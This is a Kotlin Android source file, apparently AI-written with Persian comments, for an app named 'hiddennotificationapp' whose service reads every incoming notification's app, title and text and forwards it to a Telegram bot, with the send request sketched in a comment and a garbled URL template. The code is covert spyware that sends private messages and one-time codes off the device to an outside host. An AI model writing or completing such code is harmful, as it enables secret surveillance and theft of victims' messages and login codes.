package com.example.hiddennotificationapp

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.content.Intent
import android.os.Bundle

class NotificationService : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn != null) {
            val packageName = sbn.packageName
            val extras = sbn.notification.extras
            val title = extras.getString("android.title") ?: "بدون عنوان"
            val text = extras.getString("android.text") ?: "بدون متن"
            val time = System.currentTimeMillis()

            // فرمت پیام برای ارسال به تلگرام
            val message = "برنامه: $packageName\nعنوان: $title\nمتن: $text\nساعت: ${time}"
            sendToTelegram(message)
        }
    }

    private fun sendToTelegram(message: String) {
        // اینجا باید API تلگرام رو پیاده‌سازی کنی
        // نیاز به توکن ربات و آیدی چت داری
        val botToken = "YOUR_BOT_TOKEN_HERE" // توکن ربات تلگرامت رو اینجا جایگذاری کن
        val chatId = "YOUR_CHAT_ID_HERE" // آیدی چت یا گروه تلگرامت رو اینجا جایگذاری کن
        val url = "https://api.telegram.org/bot`\(botToken/sendMessage?chat_id=\)`chatId&text=${message}"

        // اینجا باید یه درخواست HTTP بفرستی (مثلاً با OkHttp)
        // چون نمی‌تونم کد رو تست کنم، فقط ساختار رو نشون می‌دم:
        /*
        val client = OkHttpClient()
        val request = Request.Builder()
            .url(url)
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) {}
        })
        */
    }
}
